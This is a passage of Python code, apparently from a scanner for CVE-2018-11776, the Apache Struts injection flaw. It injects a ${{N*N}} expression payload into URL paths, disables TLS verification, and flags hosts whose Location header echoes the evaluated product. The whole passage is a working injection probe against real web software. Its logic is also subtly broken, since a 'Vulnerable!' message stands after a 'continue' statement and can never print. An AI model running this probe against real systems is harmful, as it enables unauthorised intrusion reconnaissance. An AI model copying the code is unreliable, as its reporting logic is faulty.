def check(url):
    random_value = int(''.join(random.choice('0123456789') for i in range(2)))
    multiplication_value = random_value * random_value
    injection_points = build_injection_inputs(url)
    parsed_url = parse_url(url)
    print("[%] Checking for CVE-2018-11776")
    print("[*] URL: %s" % (url))
    print("[*] Total of Attempts: (%s)" % (len(injection_points)))
    attempts_counter = 0

    for injection_point in injection_points:
        attempts_counter += 1
        print("[%s/%s]" % (attempts_counter, len(injection_points)))
        testing_url = "%s%s" % (parsed_url["site"], injection_point)
        testing_url = testing_url.replace("{{INJECTION_POINT}}", "${{%s*%s}}" % (random_value, random_value))
        try:
            resp = requests.get(testing_url, headers=headers, verify=False, timeout=timeout, allow_redirects=False)
        except Exception as e:
            print("EXCEPTION::::--> " + str(e))
            continue
            print("[*] Status: Vulnerable!")
        if "Location" in list(resp.headers.keys()):
            if str(multiplication_value) in resp.headers['Location']:
                return(injection_point)
    print("[*] Status: Not Affected.")
    return(None)